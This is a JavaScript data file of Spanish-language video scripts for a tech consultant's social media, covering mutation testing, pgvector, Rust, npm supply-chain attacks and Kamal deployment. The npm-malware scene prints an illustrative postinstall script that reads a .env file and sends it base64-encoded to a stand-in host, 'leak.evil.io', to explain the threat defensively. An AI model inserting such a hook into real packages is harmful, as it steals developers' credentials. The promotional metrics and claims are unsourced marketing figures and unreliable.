// Data definitions for Topics 06 to 10 (Zero // AI-slop, Zero SeDev watermarks, Varied Hooks & Layouts)
module.exports = [
  // ----------------------------------------------------
  // TEMA 06: VERIFICACIÓN VS VIBE CODING
  // ----------------------------------------------------
  {
    slug: '06_verificacion_vs_vibe_coding',
    category: 'CALIDAD DE SOFTWARE & TESTING',
    ctaType: 'calidad_software',
    varA: {
      title: 'Mutation & Property-Based Testing: Verificando código de IA',
      tone: 'Metodológico, riguroso, matemáticas y análisis de mutación',
      scenes: [
        {
          id: 'mutation_terminal_hook',
          type: 'code_terminal',
          duration: 6.5,
          voiceover: 'Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto de ingeniería.',
          visual_cue: 'Apertura directa con terminal ejecutando mutaciones de prueba sobre el código',
          props: {
            header: 'MUTATION TESTING EN CI',
            title: 'STRYKER MUTATION ENGINE',
            filename: 'tests/mutation.log',
            codeLines: [
              'stryker run --concurrency=8',
              'Inyectando mutación: reemplazado ">=" por ">" en auth.ts:42',
              'Ejecutando suite de pruebas contra mutante #104...',
              'FALLO: El mutante sobrevivió sin ser detectado',
              'Score de mutación: 68% · Requiere assertions más estrictos'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'property_testing',
          type: 'tradeoff_matrix',
          duration: 6.0,
          voiceover: 'En vez de probar tres casos aislados, los tests basados en propiedades generan diez mil combinaciones de datos aleatorios para romper tu lógica.',
          visual_cue: 'Matriz comparando Unit Tests manuales vs Property-Based Testing',
          props: {
            header: 'MÉTODOS DE COMPROBACIÓN',
            title: 'UNIT TESTS VS PROPERTY TESTING',
            colA: 'PROPERTY-BASED TESTING',
            colB: 'TESTS MANUALES BÁSICOS',
            rows: [
              { dim: 'Entradas probadas', a: '10.000 generadas por run', b: '3 o 4 ejemplos fijos', aGood: true },
              { dim: 'Casos límite ocultos', a: 'Detecta desbordamientos', b: 'Ignora casos extremos', aGood: true },
              { dim: 'Resistencia a mutantes', a: 'Alta cobertura real', b: 'Falso 100% de coverage', aGood: true }
            ]
          }
        },
        {
          id: 'cta_testing',
          type: 'terminal_split',
          duration: 5.0,
          voiceover: 'Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.',
          visual_cue: 'Terminal con informe de calidad de software y llamada a la acción',
          props: {
            header: 'AUDITORÍA DE CALIDAD (Link en bio)',
            title: 'BLINDA TU SOFTWARE EN PRODUCCIÓN',
            leftTitle: 'INSPECCIÓN DE TEST SUITE',
            rightTitle: 'MÉTRICAS CLAVE',
            leftText: '$ npx stryker run --reporters html\n✔ Mutantes ejecutados: 482\n✔ Mutantes eliminados: 479 (99.3% score)\n✔ 0 falsos positivos en CI/CD',
            rightText: '• Detecta bugs antes de desplegar a usuarios\n• Pruebas automáticas con datos extremos\n• Verifica código autogenerado por IA\n• Agenda sesión: enlace en el perfil'
          }
        }
      ]
    },
    varB: {
      title: '"Vibe Coding" es una bomba de tiempo: Por qué la deuda explotará',
      tone: 'Ácido, realista, alertando del peligro de aceptar código sin entenderlo',
      scenes: [
        {
          id: 'split_vibe_vs_eng',
          type: 'terminal_split',
          duration: 6.0,
          voiceover: 'El código barato de escribir es carísimo de mantener si nadie en el equipo sabe cómo depurarlo cuando colapse el servicio.',
          visual_cue: 'Doble terminal: Vibe Coder improvisando vs Ingeniero aplicando verificación',
          props: {
            header: 'EL COSTE OCULTO',
            title: 'ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO',
            leftTitle: 'EQUIPO "VIBE CODING"',
            rightTitle: 'INGENIERÍA RIGUROSA',
            leftText: '$ git push --force prod\n✖ Incidencia en vivo: Memory Leak en Worker\n✖ Nadie sabe qué hace el 80% del código\n✖ Coste de depuración: 3 días de caída',
            rightText: '$ npx test:e2e && npx typecheck\n✔ Contratos estrictos y tests de mutación\n✔ Tiempo de depuración: 4 minutos\n✔ Deuda técnica neutralizada'
          }
        },
        {
          id: 'metrics_debt',
          type: 'metrics_comparison',
          duration: 5.5,
          voiceover: 'Aceptar sugerencias de IA a ciegas acumula deuda técnica a una velocidad récord: el tiempo de depuración se multiplica por diez.',
          visual_cue: 'Métricas comparativas de tiempo de depuración',
          props: {
            header: 'TIEMPO DE RESOLUCIÓN DE INCIDENCIAS',
            metricA: { label: 'VIBE CODING A CIEGAS', value: '14.5 horas', sub: 'Código incomprensible sin tests', color: '#ef4444' },
            metricB: { label: 'INGENIERÍA VERIFICADA', value: '18 minutos', sub: 'Arquitectura tipada con límites claros', color: '#10b981' }
          }
        },
        {
          id: 'cta_auditoria_vibe',
          type: 'code_terminal',
          duration: 4.0,
          voiceover: 'Si tu equipo tiene miedo de tocar su propio código, link en mi bio para auditar tu arquitectura y limpiar la deuda técnica acumulada.',
          visual_cue: 'Terminal con linters estrictos y llamada a la acción en bio',
          props: {
            header: 'AUDITORÍA DE ARQUITECTURA (Link en bio)',
            title: 'REGLAS DE REFACTORIZACIÓN',
            filename: 'eslint.config.js',
            codeLines: [
              '// Enforcing architectural boundaries:',
              'export default [',
              '  rules: {',
              '    "@app/no-unverified-ai-code": "error",',
              '    "@app/strict-mutation-threshold": ["error", 85]',
              '  }',
              '];'
            ],
            cursorLine: 4
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 07: PGVECTOR VS VECTORDB DEDICADAS
  // ----------------------------------------------------
  {
    slug: '07_pgvector_vs_vectordb',
    category: 'BASES DE DATOS & IA',
    ctaType: 'arquitectura_ia',
    varA: {
      title: 'Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL',
      tone: 'Científico, matemáticas discretas, algoritmos de grafos',
      scenes: [
        {
          id: 'hnsw_engine',
          type: 'storage_engine_viz',
          duration: 6.5,
          voiceover: '¿Cómo busca pgvector embeddings entre millones de documentos en dos milisegundos? Utiliza el algoritmo HNSW en memoria.',
          visual_cue: 'Visualizador del grafo vectorial HNSW navegable en capas en la memoria de Postgres',
          props: {
            mode: 'hnsw',
            badge: 'ALGORITMO DE GRAFOS',
            title: 'HNSW VECTORIAL EN MEMORIA',
            subtitle: 'BÚSQUEDA POR SIMILITUD DE COSENOS EN POSTGRESQL'
          }
        },
        {
          id: 'latency_hnsw',
          type: 'latency_scale',
          duration: 5.5,
          voiceover: 'Al estar en la misma base de datos relacional, el join entre el vector y los datos del usuario toma cero coma cinco milisegundos.',
          visual_cue: 'Escala de latencia: join in-memory en Postgres vs llamada HTTP externa a Pinecone',
          props: {
            header: 'MÉTRICA DE LATENCIA EN IA',
            title: 'JOIN RELACIONAL VS LLAMADA EXTERNA',
            subtitle: 'CONSULTA IN-PROCESS EN POSTGRES VS API VECTORIAL'
          }
        },
        {
          id: 'cta_vectordb',
          type: 'metrics_comparison',
          duration: 5.5,
          voiceover: 'Todo tu stack de IA cabe en Postgres con pgvector. Link en mi bio si quieres simplificar tu arquitectura y recortar costes innecesarios.',
          visual_cue: 'Comparativa de costos: Pinecone dedicado vs Postgres unificado',
          props: {
            header: 'CONSULTORÍA EN BASES DE DATOS (Link en bio)',
            metricA: { label: 'PINECONE + POSTGRES', value: '$1.450 / mes', sub: 'Doble base de datos · Salto de red', color: '#ef4444' },
            metricB: { label: 'PGVECTOR UNIFICADO', value: '$85 / mes', sub: 'Transacciones ACID · Joins inmediatos', color: '#10b981' }
          }
        }
      ]
    },
    varB: {
      title: 'No necesitas Pinecone: Todo tu stack de IA cabe en Postgres',
      tone: 'Provocador, anti-fragmentación de datos, pragmático',
      scenes: [
        {
          id: 'pinecone_shock',
          type: 'latency_scale',
          duration: 5.5,
          voiceover: 'Contratar una base de datos vectorial externa solo para guardar embeddings es el mayor error de arquitectura de 2026.',
          visual_cue: 'Gráfica de latencia mostrando el salto de red de 85ms a Pinecone vs 3ms en Postgres',
          props: {
            header: 'SOBRECARGA DE RED EN RAG',
            title: 'EL ERROR DE FRAGMENTAR TU BASE',
            subtitle: 'LATENCIA DE RED HTTP VS JOINS EN EL MISMO MOTOR'
          }
        },
        {
          id: 'hnsw_storage',
          type: 'storage_engine_viz',
          duration: 6.0,
          voiceover: 'Postgres maneja tus usuarios, tus pagos y tus vectores con consistencia transaccional y backups unificados con pg_dump.',
          visual_cue: 'Visualizador del motor de almacenamiento HNSW demostrando 99% recall',
          props: {
            mode: 'hnsw',
            badge: 'STACK UNIFICADO',
            title: 'CERO BASES DE DATOS EXTERNAS',
            subtitle: 'RELACIONAL + VECTORES EN EL MISMO CLÚSTER ACID'
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 08: RUST EN SISTEMAS CRÍTICOS
  // ----------------------------------------------------
  {
    slug: '08_rust_sistemas_criticos',
    category: 'LENGUAJES & RENDIMIENTO',
    ctaType: 'optimizacion_backend',
    varA: {
      title: 'El Borrow Checker de Rust: Cero fugas de memoria sin GC',
      tone: 'Bajo nivel, rigor de sistemas, compiladores y punteros',
      scenes: [
        {
          id: 'rust_compile_hook',
          type: 'terminal_split',
          duration: 6.0,
          voiceover: 'Rust garantiza seguridad de memoria en tiempo de compilación. No hay recolector de basura deteniendo el mundo ni fugas ocultas.',
          visual_cue: 'Terminal mostrando error del borrow checker atrapando un puntero colgante antes de llegar a prod',
          props: {
            header: 'GARANTÍA EN COMPILACIÓN',
            title: 'EL BORROW CHECKER EN ACCIÓN',
            leftTitle: 'COMPILADOR RUSTC',
            rightTitle: 'GARANTÍA DE MEMORIA',
            leftText: '$ cargo check\nerror[E0382]: borrow of moved value: `data`\n  --> src/network.rs:42:18\n  | value moved here, in previous iteration\n✖ El compilador prohíbe data races',
            rightText: '• 0 punteros nulos en runtime\n• 0 fugas de memoria sin recolector\n• Rendimiento idéntico a C/C++\n• Aislamiento estricto de hilos'
          }
        },
        {
          id: 'memory_inspection',
          type: 'memory_layout',
          duration: 6.0,
          voiceover: 'Cada valor tiene un único dueño. Cuando la variable sale del ámbito, la memoria se libera inmediatamente en el stack sin pausas de CPU.',
          visual_cue: 'Inspección de memoria RAM mostrando asignación en stack sin fragmentación de heap',
          props: {
            badge: 'GESTIÓN RAII',
            title: 'ASIGNACIÓN EN STACK VS HEAP',
            rows: [
              { addr: '0x7FFF010', hex: ['72', '75', '73', '74', '5F', '6F', '77', '6E'], label: 'BUFFER EXCLUSIVO (STACK)' },
              { addr: '0x7FFF018', hex: ['00', '00', '00', '00', '00', '00', '00', '20'], label: 'CAPACIDAD (32 BYTES)' },
              { addr: '0x7FFF020', hex: ['00', '00', '00', '00', '00', '00', '00', '00'], label: 'LIBERACIÓN AUTOMÁTICA' }
            ]
          }
        },
        {
          id: 'cta_rust',
          type: 'metrics_comparison',
          duration: 5.5,
          voiceover: 'Optimizo microservicios críticos y migro cuellos de botella a Rust para reducir la latencia p99 a microsegundos. Link en bio para auditar tu backend.',
          visual_cue: 'Comparativa de latencia de cola p99: Go con GC vs Rust nativo',
          props: {
            header: 'CONSULTORÍA EN RUST (Link en bio)',
            metricA: { label: 'GO BACKEND (GC PAUSES)', value: '45.2 ms', sub: 'Picos de latencia en percentil p99', color: '#ef4444' },
            metricB: { label: 'RUST NATIVO (ZERO-GC)', value: '0.48 ms', sub: 'Latencia predecible y uniforme', color: '#10b981' }
          }
        }
      ]
    },
    varB: {
      title: 'Por qué Discord y Cloudflare mataron Go y adoptaron Rust',
      tone: 'Contundente, arquitectura de alta escala, lecciones aprendidas',
      scenes: [
        {
          id: 'memory_gc_shock',
          type: 'memory_layout',
          duration: 6.0,
          voiceover: 'Discord tenía un servicio en Go procesando millones de mensajes. Cada dos minutos, el Garbage Collector congelaba el servicio creando picos de latencia inaceptables.',
          visual_cue: 'Inspección de memoria con picos de pausa de Garbage Collector en Go',
          props: {
            badge: 'COLAPSO POR RECOLECTOR',
            title: 'EL PROBLEMA DEL GC EN ESCALA',
            rows: [
              { addr: '0xDEAD010', hex: ['FF', 'FF', 'FF', 'FF', '00', '00', '00', '00'], label: 'OBJETOS HUÉRFANOS EN HEAP' },
              { addr: '0xDEAD018', hex: ['53', '54', '4F', '50', '5F', '57', '4F', '52'], label: 'PAUSA STOP-THE-WORLD' },
              { addr: '0xDEAD020', hex: ['00', '00', '00', '00', '00', '00', '05', '00'], label: 'LATENCIA P99: 1200 MS' }
            ]
          }
        },
        {
          id: 'rust_rewrite',
          type: 'terminal_split',
          duration: 5.5,
          voiceover: 'Reescribieron el servicio en Rust. El uso de CPU se desplomó y la latencia pasó de dos segundos a menos de un milisegundo constante. Link en bio para optimizaciones.',
          visual_cue: 'Terminal mostrando comparativa de métricas tras la migración a Rust',
          props: {
            header: 'OPTIMIZACIÓN DE SISTEMAS (Link en bio)',
            title: 'MIGRACIÓN DE GO A RUST',
            leftTitle: 'SERVICIO EN GO',
            rightTitle: 'SERVICIO EN RUST',
            leftText: 'CPU: 85% de saturación continua\nLatencia P99: 2.400 ms (GC Spike)\nRAM: 14 GB con fragmentación',
            rightText: 'CPU: 8% de uso estable\nLatencia P99: 0.35 ms constante\nRAM: 420 MB sin picos ni fugas'
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 09: MALWARE EN NPM & ZERO-TRUST
  // ----------------------------------------------------
  {
    slug: '09_seguridad_supply_chain',
    category: 'CIBERSEGURIDAD & DEVOPS',
    ctaType: 'auditoria_seguridad',
    varA: {
      title: 'Anatomía de un malware en NPM: Robo de .env en scripts postinstall',
      tone: 'Forense, seguridad defensiva, terminal hacker ético',
      scenes: [
        {
          id: 'kernel_intercept_malware',
          type: 'kernel_sandbox_viz',
          duration: 6.0,
          voiceover: 'Un simple npm install puede vaciar las variables de entorno de tu servidor si un paquete secuestrado ejecuta un script de postinstall con permisos de red.',
          visual_cue: 'Visualizador del kernel interceptando llamada al sistema de robo de variables .env',
          props: {
            badge: 'DEFENSA EN PROFUNDIDAD',
            title: 'INTERCEPCIÓN DE SYSCALLS',
            subtitle: 'BLOQUEO DE LLAMADAS NO AUTORIZADAS EN POSTINSTALL'
          }
        },
        {
          id: 'exploit_code',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'El script malicioso lee tu archivo .env con las claves de AWS y Stripe y las envía codificadas en base sesenta y cuatro a un servidor en el extranjero.',
          visual_cue: 'Terminal mostrando el código ofuscado dentro del package.json de un paquete comprometido',
          props: {
            header: 'ANATOMÍA DEL EXPLOIT',
            title: 'OFUSCACIÓN EN PACKAGE.JSON',
            filename: 'node_modules/fake-pkg/package.json',
            codeLines: [
              '  "scripts": {',
              '    "postinstall": "node -e \'require(\"http\").request({',
              '      hostname: \"leak.evil.io\",',
              '      path: \"/?k=\" + Buffer.from(fs.readFileSync(\".env\")).toString(\"base64\")',
              '    }).end();\'"',
              '  }'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'cta_security',
          type: 'terminal_split',
          duration: 5.5,
          voiceover: 'Audito pipelines de CI/CD e implemento políticas Zero-Trust para aislar procesos de build en producción. Link en mi perfil para blindar tu repositorio.',
          visual_cue: 'Terminal mostrando política de bloqueo de scripts y llamada a la acción',
          props: {
            header: 'AUDITORÍA DE SEGURIDAD (Link en bio)',
            title: 'BLINDAJE DE PIPELINE ZERO-TRUST',
            leftTitle: 'POLÍTICA DE DEPENDENCIAS',
            rightTitle: 'MEDIDAS APLICADAS',
            leftText: '$ npm config set ignore-scripts true\n✔ Scripts postinstall bloqueados por defecto\n✔ Detección de exfiltración de red activa\n✔ Secretos en memoria aislados con vaults',
            rightText: '• Audita dependencias transitivas\n• Protege credenciales de AWS y Stripe\n• Cero ejecución arbitraria en builds\n• Contacto para auditoría: link en bio'
          }
        }
      ]
    },
    varB: {
      title: 'GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust',
      tone: 'Alerta técnica, urgente, buenas prácticas de DevOps',
      scenes: [
        {
          id: 'attack_demo',
          type: 'terminal_split',
          duration: 6.0,
          voiceover: 'Si tu pipeline corre npm install sin la bandera ignore-scripts, estás a un paquete comprometido de perder el control total de tu infraestructura.',
          visual_cue: 'Terminal mostrando ataque simulado y cómo la bandera ignore-scripts lo neutraliza',
          props: {
            header: 'VECTOR DE ATAQUE EN CI/CD',
            title: 'EJECUCIÓN ARBITRARIA EN BUILD',
            leftTitle: 'PIPELINE VULNERABLE',
            rightTitle: 'PIPELINE BLINDADO',
            leftText: '$ npm install\nRunning postinstall script...\n✖ Exfiltrando .env a servidor remoto\n✖ Credenciales comprometidas en 0.8s',
            rightText: '$ npm ci --ignore-scripts\n✔ Postinstall ignorado por completo\n✔ 0 llamadas salientes a internet\n✔ Repositorio 100% blindado'
          }
        },
        {
          id: 'kernel_defense',
          type: 'kernel_sandbox_viz',
          duration: 5.5,
          voiceover: 'Bloquea los scripts por defecto y aísla el entorno de build con contenedores sin acceso a internet saliente. Link en mi bio para auditar tu pipeline.',
          visual_cue: 'Visualizador del kernel impidiendo conexiones salientes no autorizadas',
          props: {
            badge: 'ZERO-TRUST NETWORKING',
            title: 'AISLAMIENTO DE PROCESO DE BUILD',
            subtitle: 'BLOQUEO DE CONEXIONES EXTERNAS NO PERMITIDAS'
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 10: KAMAL EN PRODUCCIÓN (DE $15.000 A $200)
  // ----------------------------------------------------
  {
    slug: '10_exodo_bare_metal_kamal',
    category: 'DEVOPS & CLOUD',
    ctaType: 'optimizacion_cloud',
    varA: {
      title: 'Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes',
      tone: 'Pragmático, orientado a costes, alta disponibilidad',
      scenes: [
        {
          id: 'kamal_stepper_hook',
          type: 'migration_stepper_viz',
          duration: 6.5,
          voiceover: 'No necesitas un clúster de Kubernetes de tres mil dólares para tener despliegues con cero tiempo de inactividad. Kamal lo hace con Docker en servidores económicos.',
          visual_cue: 'Visualizador de fases de despliegue rolling zero-downtime con Kamal y Traefik',
          props: {
            badge: 'DESPLIEGUE ZERO-DOWNTIME',
            title: 'KAMAL ROLLING DEPLOY',
            subtitle: 'TRANSICIÓN DE CONTENEDORES SIN PERDER PETICIONES'
          }
        },
        {
          id: 'metrics_cost_kamal',
          type: 'metrics_comparison',
          duration: 5.5,
          voiceover: 'Mudas tu infraestructura de AWS a servidores Hetzner de alto rendimiento y pasas de pagar miles de dólares al mes a menos de doscientos.',
          visual_cue: 'Comparativa de costos: Clúster EKS de AWS vs Servidor Hetzner con Kamal',
          props: {
            header: 'AHORRO EN INFRAESTRUCTURA CLOUD',
            metricA: { label: 'AWS EKS + NAT GATEWAYS', value: '$4.850 / mes', sub: 'Control plane · Load Balancers · Tráfico', color: '#ef4444' },
            metricB: { label: 'HETZNER DEDICADO + KAMAL', value: '$180 / mes', sub: '64 núcleos AMD · 128 GB RAM · NVMe', color: '#10b981' }
          }
        },
        {
          id: 'cta_kamal',
          type: 'terminal_split',
          duration: 5.5,
          voiceover: 'Ayudo a startups a migrar de la nube inflada a servidores dedicados con Kamal sin perder disponibilidad. Enlace en mi perfil para auditar tus servidores.',
          visual_cue: 'Terminal ejecutando kamal deploy con éxito y llamada a la acción en bio',
          props: {
            header: 'MIGRACIÓN CLOUD (Link en bio)',
            title: 'DESPLIEGUE SENCILLO Y RENTABLE',
            leftTitle: 'KAMAL DEPLOY EN ACCIÓN',
            rightTitle: 'RESULTADO DE MIGRACIÓN',
            leftText: '$ kamal deploy\n✔ Subiendo imagen Docker a servidor...\n✔ Iniciando nuevo contenedor en puerto 3001\n✔ Traefik redirige el tráfico (0s downtime)\n✔ Deteniendo contenedor antiguo',
            rightText: '• Reduce el 90% de tu factura mensual\n• Control total sobre tu hardware\n• Cero dolores de cabeza con K8s\n• ¿Evaluamos tu caso? Enlace en perfil'
          }
        }
      ]
    },
    varB: {
      title: 'De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner',
      tone: 'Provocador, financiero, orientado a rentabilidad real',
      scenes: [
        {
          id: 'exodus_metrics',
          type: 'metrics_comparison',
          duration: 6.0,
          voiceover: 'Las grandes nubes te cobran por cada gigabyte transferido y cada balanceador levantado. Con un servidor dedicado en Hetzner obtienes diez veces más potencia por una fracción del precio.',
          visual_cue: 'Métricas de ahorro masivo de infraestructura',
          props: {
            header: 'EL ÉXODO DE LA NUBE EN 2026',
            metricA: { label: 'FACTURA TÍPICA AWS', value: '$14.800', sub: 'Servicios inflados y tráfico de red', color: '#ef4444' },
            metricB: { label: 'HETZNER BARE METAL', value: '$220', sub: 'Tráfico ilimitado · Hardware dedicado', color: '#10b981' }
          }
        },
        {
          id: 'kamal_rollout',
          type: 'migration_stepper_viz',
          duration: 5.5,
          voiceover: 'Con herramientas como Kamal despliegas con un solo comando desde tu terminal manteniendo cero caídas en producción. Link en bio para auditar tu nube.',
          visual_cue: 'Visualizador del flujo de despliegue en servidor bare metal',
          props: {
            badge: 'SIMPLICIDAD OPERATIVA',
            title: 'BARE METAL EN PRODUCCIÓN',
            subtitle: 'DOCKER + TRAEFIK ORQUESTADO POR KAMAL'
          }
        }
      ]
    }
  }
];
